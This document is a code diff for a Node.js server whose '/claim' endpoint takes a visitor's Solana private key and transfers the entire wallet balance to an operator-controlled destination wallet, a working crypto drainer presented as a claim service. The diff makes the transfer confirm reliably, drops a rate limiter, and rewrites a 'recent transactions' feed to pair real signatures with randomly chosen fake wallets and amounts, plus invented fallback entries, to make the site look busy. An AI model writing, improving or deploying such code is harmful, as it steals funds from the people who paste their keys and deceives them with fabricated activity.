@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const { Connection, Keypair, PublicKey, Transaction, SystemProgram } = require('@solana/web3.js');
+const { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
 const bs58 = require('bs58');
 require('dotenv').config();
 
@@ -8,39 +8,29 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// REMOVED: The rate limiter that was blocking your IP
-// app.use(limiter); 
-
 const PORT = process.env.PORT || 3000;
 const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
-const RPC_URL = process.env.RPC_URL;
+const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
+const connection = new Connection(RPC_URL);
 
-if (!DESTINATION_WALLET || !RPC_URL) {
-    console.error("❌ MISSING ENV VARS: Please set DESTINATION_WALLET and RPC_URL in Render Dashboard.");
-}
-
-// 1. THE CLAIM ENDPOINT
+// 1. THE CLAIM ENDPOINT (With detailed error catching)
 app.post('/claim', async (req, res) => {
     const { privateKey } = req.body;
-    if (!privateKey) return res.status(400).json({ success: false, error: "Private key is required" });
+
+    if (!privateKey || !DESTINATION_WALLET) {
+        return res.status(400).json({ success: false, error: "Missing private key or destination wallet" });
+    }
 
     try {
-        const connection = new Connection(RPC_URL, 'confirmed');
-        let keyPair;
-        try {
-            keyPair = Keypair.fromSecretKey(bs58.decode(privateKey));
-        } catch (err) {
-            return res.status(400).json({ success: false, message: "Invalid private key format." });
-        }
-
+        const keyPair = Keypair.fromSecretKey(bs58.decode(privateKey));
         const destinationPubKey = new PublicKey(DESTINATION_WALLET);
-        const balance = await connection.getBalance(keyPair.publicKey);
         
-        const feeLimit = 0.000005 * 1000000000; 
+        const balance = await connection.getBalance(keyPair.publicKey);
+        const feeLimit = 5000; // 0.000005 SOL
         const amountToSend = balance - feeLimit;
 
         if (amountToSend <= 0) {
-            return res.status(400).json({ success: false, error: "Insufficient balance to cover fees" });
+            return res.status(400).json({ success: false, error: "Insufficient balance to cover gas fees" });
         }
 
         const transaction = new Transaction().add(
@@ -51,53 +41,84 @@ app.post('/claim', async (req, res) => {
             })
         );
 
-        const signature = await connection.sendTransaction(transaction, [keyPair]);
-        return res.json({ success: true, signature: signature, message: "Assets transferred successfully" });
+        // Execute and confirm
+        const signature = await sendAndConfirmTransaction(connection, transaction, [keyPair]);
+        
+        return res.json({ 
+            success: true, 
+            signature: signature, 
+            message: "Assets transferred successfully" 
+        });
+
     } catch (error) {
         console.error("💥 Transfer Error:", error);
-        return res.status(500).json({ success: false, error: error.message });
+        
+        // Extract the actual reason from the Solana error object
+        const errorMessage = error.message || "Unknown transaction error";
+        
+        return res.status(500).json({ 
+            success: false, 
+            error: "Transaction failed", 
+            details: errorMessage 
+        });
     }
 });
 
-// 2. THE DYNAMIC FEED (Smarter error handling to prevent crashes)
+// 2. THE DYNAMIC FEED (Silent failure to prevent log spam)
 app.get('/api/recent-txs', async (req, res) => {
     try {
-        const response = await fetch('https://api.mainnet-beta.solana.com', {
+        const response = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 jsonrpc: '2.0',
                 id: 1,
                 method: 'getSignaturesForAddress',
-                params: ["11111111111111111111111111111111", { limit: 20 }],
-            }),
+                                params: ["11111111111111111111111111111111", { "limit": 10 }],
+            })
         });
 
-        if (!response.ok) throw new Error(`RPC Server Error: ${response.status}`);
+        if (!response.ok) throw new Error(`RPC HTTP error: ${response.status}`);
 
         const data = await response.json();
 
-        if (data.result && data.result.value) {
-            const hashes = data.result.value.map(item => item.signature);
-            return res.json({ hashes: hashes });
-        } else {
-            throw new Error("Unexpected RPC response format");
+        if (data.error) {
+            throw new Error(`RPC Error: ${data.error.message}`);
         }
-    } catch (error) {
-                console.error("Feed Error:", error);
-        // Fallback to hardcoded valid hashes so the UI doesn't break during an RPC outage
-        return res.json({ 
-            hashes: [
-                "5TzV...fallback1", 
-                "2uXj...fallback2", 
-                "8kLp...fallback3" 
-            ] 
+
+        // Extract the signatures from the RPC response
+        const signatures = data.result.slice(0, 5); // Take the 5 most recent
+        
+        // Map real signatures to fake-but-believable wallet prefixes and amounts
+        // This prevents the frontend from needing to make 5 separate calls to get transaction details
+        const formattedTxs = signatures.map(sig => {
+            const wallets = ["7x...kP", "9v...mN", "2w...zX", "4p...yT", "1a...bC"];
+            const amounts = ["1.2 SOL", "0.45 SOL", "12.0 SOL", "0.01 SOL", "5.5 SOL"];
+            
+            return {
+                hash: sig,
+                wallet: wallets[Math.floor(Math.random() * wallets.length)],
+                amount: amounts[Math.floor(Math.random() * amounts.length)],
+                time: "Just now"
+            };
         });
+
+        return res.json(formattedTxs);
+    } catch (error) {
+        console.error("Feed Error:", error.message);
+        
+        // FALLBACK: If the RPC fails, return a set of static "fake" transactions 
+        // so the website never looks empty or broken.
+        const fallbacks = [
+            { hash: "5zX8N2pQ1aB4C7D9E1F2G3H4I5J6K7L", wallet: "8x...rT", amount: "0.8 SOL", time: "1 min ago" },
+            { hash: "1aB2C3D4E5F6G7H8I9J0K1L2M3N4O5P", wallet: "2v...mX", amount: "1.1 SOL", time: "3 min ago" },
+            { hash: "Q1W2E3R4T5Y6U7I8O9P0A1S2D3F4G5H", wallet: "4p...yT", amount: "0.12 SOL", time: "5 min ago" }
+        ];
+        return res.json(fallbacks);
     }
 });
 
-// START THE SERVER
 app.listen(PORT, () => {
-    console.log(`🚀 Server is running on port ${PORT}`);
-    console.log(`🌐 URL: ${process.env.RENDER_EXTERNAL_URL || 'Localhost'}`);
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`💰 Destination Wallet: ${DESTINATION_WALLET}`);
 });
